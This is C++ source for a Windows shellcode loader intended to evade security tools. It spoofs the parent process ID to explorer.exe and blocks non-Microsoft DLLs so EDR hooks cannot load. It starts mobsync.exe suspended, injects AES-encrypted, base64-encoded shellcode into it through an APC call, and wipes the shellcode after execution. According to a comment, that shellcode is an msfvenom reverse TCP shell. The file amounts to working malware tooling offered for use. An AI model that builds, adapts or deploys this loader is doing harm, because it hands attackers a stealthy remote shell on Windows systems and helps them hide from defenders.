#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

// Process Hollowing
VOID hollow(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\mobsync.exe");
    if (!CreateProcess(
        hollow_bin,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(10000);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
    shellcode = "5WJDDSbb0Kh7+npFtMpwoO6jJwQ6LKvoys6rZ9I+LFIfr6sCjINscuKryZ3q7PKKSkEwiF2DQQYDYJyNGP+LCc3xF3RIlCrrM5TPrze2E64GKNJwmmLLpvGGAM6B0xrp3OARcAgXzksNxR2mmXx1CFgJfc+pe0xsUQylgSEW9lmZsjifE87bs9XEz45SwmBKAJyR3UE0PZyjsr/FqWmZN0W0sLWsiQPo618CepCkfq5ZVF/V2iUR6+y7XQPlz2WfprshOaGqv48o6AKVMwLAyJ6iqVq2X8LzagEdGLzOUVXkJAgzntp0e7C9IgxW8O1THI0dB9GDjsn+tS1gitYLJ+7lUEYBVnrjCWB2IaQdDiRJ+5ZK/R8F6whOITEf+VpB/EJ1DofH56MDbGo+WkDzsdHnG2drtiYTXXdweqGiJzCBwYNjzGB2s4xW8JfKWjBvDerO22TBbpp21/AJDtHt/eaLXmzjsVxPT5GNF2lZkQf04VQVpoFKV1VvSPEhFVeT1vRN+f6e6XCiMSU8ziPbl9B5kgYrRq51TOD4zmuOysGa4Klt51nnmyxFsq/4Xx4kOioZTf2/oJ7X7UUVFaM0YqwHht5Vaf6RmnGVwwooxAnqx2MdnJTx2dhoCk3MxVMTDtt7sdwiAYIM4Ekr4rXRntmCHebl17bbVdqBdTZM/u9Ggh7le4gemOdT4ag2WRhEVTbbiTRCsarVmIPWeB17p5qzw0XbyweWNl/kOJZsaaHKOnR3Zy0mG9a8SORmJTs/E7nPpb5gVFiaSdwDPs3qRklNbZwd+QbL6LJdCZsDMuY69z93X2gyHc60yVpcJTGd07iqwotmCIf80AlcpjjrkiTy5xwT7s62dE7Gs/ZphRuRHHS9UCLwqC85dBY08fqalmvoC59EdwXw8y+YFD2kC3vDtELY0hM4kZ+669al0XytP+22ju3mbmA2agv4Axr7xUo8eXxVA1Ov6exWymhnq92CqhGbh7tFcL9Zcq2431M5K2k3ZmGUVxiHZRyfOZv6ZopIrp81P6jtUNkQN9Ud51HMuh4iVrZsbMZ+Bo6W506roPSQCIYZUiz7rOq4Ai+omnaY+5+sRZ+QllV8t6cZhY+vipbX6+p+QMzhGYLDFJJKK6Zql3Zo49EZetF3rgItGea/d5QTYwCATPjrMeHjvSkapak7ifC54+hWLvq9QDukoWaT+3BirHHDZHvhlguVpk+MwENoLACsZiJ/sH9ylA==";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32] = {0x9e,0x91,0x45,0x7a,0xa1,0x32,0xe1,0x09,0x16,0xb2,0x09,0xee,0xff,0x6f,0x7a,0x44,0xfd,0xd8,0x12,0x90,0xd7,0xd0,0xdf,0x39,0x0a,0x46,0x7b,0x9a,0x52,0xe8,0x2e,0xd6};
    uint8_t iv[16] = {0xdb,0x03,0xef,0xe3,0xcf,0xb6,0x5a,0x33,0xe2,0x6b,0x41,0x51,0xc2,0xd2,0xb4,0x46};
    
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = ciphertext.size();
    for (int i = 0; i < c_size; i++)
    {
        if (ciphertext[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    hollow(recovered);
    return 0;
}

